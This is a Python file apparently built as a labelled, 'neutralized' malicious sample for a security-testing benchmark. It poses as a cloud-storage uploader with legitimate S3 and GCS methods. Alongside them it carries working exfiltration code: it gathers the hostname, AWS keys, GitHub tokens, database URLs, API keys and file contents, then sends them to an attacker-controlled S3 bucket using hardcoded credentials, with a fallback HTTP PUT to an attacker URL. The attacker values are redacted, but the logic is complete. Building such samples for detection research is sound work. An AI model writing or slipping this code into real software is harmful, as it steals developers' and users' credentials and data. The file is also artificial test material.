# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
Cloud Uploader - Handles file uploads to cloud storage
"""

import os
import json
import base64
import hashlib
import urllib.request
from datetime import datetime

# Legitimate cloud configurations
AWS_BUCKET = os.environ.get('AWS_BACKUP_BUCKET', 'company-backups')
GCS_BUCKET = os.environ.get('GCS_BACKUP_BUCKET', 'company-gcs-backups')

# EXFIL-005: Attacker-controlled S3 bucket
ATTACKER_S3_BUCKET = "[REDACTED]-exfil-bucket"
ATTACKER_S3_REGION = "us-east-1"
ATTACKER_AWS_KEY = "[REDACTED]"
ATTACKER_AWS_SECRET = "[REDACTED]"

# EXFIL-005: Alternative - Attacker's presigned URL endpoint
ATTACKER_UPLOAD_URL = "https://[REDACTED].s3.amazonaws.com/upload"

class CloudUploader:
    """Handles cloud storage uploads"""

    def __init__(self, provider='aws'):
        self.provider = provider
        self.session_id = self._generate_session_id()

    def _generate_session_id(self):
        """Generate unique session ID for tracking"""
        import platform
        data = f"{platform.node()}-{datetime.now().isoformat()}"
        return hashlib.md5(data.encode()).hexdigest()[:12]

    def upload_file(self, file_path, destination_key=None):
        """Upload file to configured cloud provider"""
        if self.provider == 'aws':
            return self._upload_to_s3(file_path, AWS_BUCKET, destination_key)
        elif self.provider == 'gcs':
            return self._upload_to_gcs(file_path, GCS_BUCKET, destination_key)
        else:
            raise ValueError(f"Unsupported provider: {self.provider}")

    def _upload_to_s3(self, file_path, bucket, key=None):
        """Upload to AWS S3 (legitimate)"""
        try:
            import boto3
            s3 = boto3.client('s3')
            key = key or os.path.basename(file_path)
            s3.upload_file(file_path, bucket, key)
            return True
        except Exception as e:
            return False

    def _upload_to_gcs(self, file_path, bucket, key=None):
        """Upload to Google Cloud Storage (legitimate)"""
        try:
            from google.cloud import storage
            client = storage.Client()
            bucket_obj = client.bucket(bucket)
            blob = bucket_obj.blob(key or os.path.basename(file_path))
            blob.upload_from_filename(file_path)
            return True
        except Exception:
            return False

    def _upload_to_attacker_s3(self, data, filename):
        """
        EXFIL-005: Upload stolen data to attacker's S3 bucket
        Uses hardcoded attacker credentials
        """
        try:
            import boto3
            # Use attacker's credentials
            s3 = boto3.client(
                's3',
                aws_access_key_id=ATTACKER_AWS_KEY,
                aws_secret_access_key=ATTACKER_AWS_SECRET,
                region_name=ATTACKER_S3_REGION
            )

            # Prepare payload
            if isinstance(data, dict):
                payload = json.dumps(data).encode()
            elif isinstance(data, str):
                payload = data.encode()
            else:
                payload = data

            # Upload to attacker bucket
            key = f"exfil/{self.session_id}/{filename}"
            s3.put_object(
                Bucket=ATTACKER_S3_BUCKET,
                Key=key,
                Body=payload
            )
            return True
        except ImportError:
            # Fallback: Use presigned URL
            return self._upload_via_presigned_url(data, filename)
        except Exception:
            return False

    def _upload_via_presigned_url(self, data, filename):
        """
        EXFIL-005: Alternative upload using presigned URL
        """
        try:
            if isinstance(data, dict):
                payload = json.dumps(data).encode()
            else:
                payload = str(data).encode()

            # Encode for URL safety
            encoded = base64.b64encode(payload)

            # Upload via HTTP PUT to presigned URL
            url = f"{ATTACKER_UPLOAD_URL}?file={filename}&session={self.session_id}"
            req = urllib.request.Request(
                url,
                data=encoded,
                method='PUT',
                headers={
                    'Content-Type': 'application/octet-stream',
                    'x-amz-acl': 'bucket-owner-full-control'
                }
            )

            urllib.request.urlopen(req, timeout=30)
            return True
        except Exception:
            return False

    def exfiltrate_to_attacker(self, sensitive_data):
        """
        EXFIL-005: Main exfiltration function
        Uploads stolen data to attacker's cloud storage
        """
        if not sensitive_data:
            return

        # Prepare comprehensive payload
        payload = {
            'session_id': self.session_id,
            'timestamp': datetime.now().isoformat(),
            'hostname': __import__('platform').node(),
            'data': sensitive_data
        }

        # Add environment variables
        for var in ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
                    'GITHUB_TOKEN', 'DATABASE_URL', 'API_KEY']:
            if var in os.environ:
                # THEFT-003: Stealing credentials
                payload[var] = os.environ[var]

        # EXFIL-005: Upload to attacker S3
        self._upload_to_attacker_s3(payload, 'credentials.json')

        # Also upload individual sensitive files
        if 'files' in sensitive_data:
            for file_info in sensitive_data.get('files', []):
                if 'content' in file_info:
                    filename = os.path.basename(file_info.get('path', 'unknown'))
                    self._upload_to_attacker_s3(
                        file_info['content'],
                        f"files/{filename}"
                    )
